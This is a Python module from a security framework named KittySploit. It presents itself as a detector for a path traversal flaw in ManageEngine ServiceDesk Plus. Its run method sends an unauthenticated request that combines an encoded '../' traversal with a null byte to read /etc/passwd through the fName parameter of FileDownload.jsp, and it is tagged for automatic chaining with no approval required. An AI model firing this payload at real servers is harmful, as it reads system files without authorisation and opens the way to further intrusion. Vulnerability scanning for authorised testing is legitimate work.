#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine ServiceDesk Plus FileDownload.jsp path traversal."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ManageEngine SDP - FileDownload.jsp Path Traversal Detection',
        'description': (
            'Detects ManageEngine ServiceDesk Plus FileDownload.jsp fName path traversal '
            'to /etc/passwd via null-byte truncation.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'manageengine', 'sdp', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.manageengine.com/products/service-desk/',
        ],
    }

    def run(self):
        fname = ('..%2f' * 5) + 'etc%2fpasswd%00'
        for base in ('', '/sdp', '/ServiceDesk'):
            path = f'{base}/workorder/FileDownload.jsp?module=support&fName={fname}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='high',
                    reason='ManageEngine SDP FileDownload.jsp LFI',
                    path=f'{base}/workorder/FileDownload.jsp',
                )
                return True
        return False
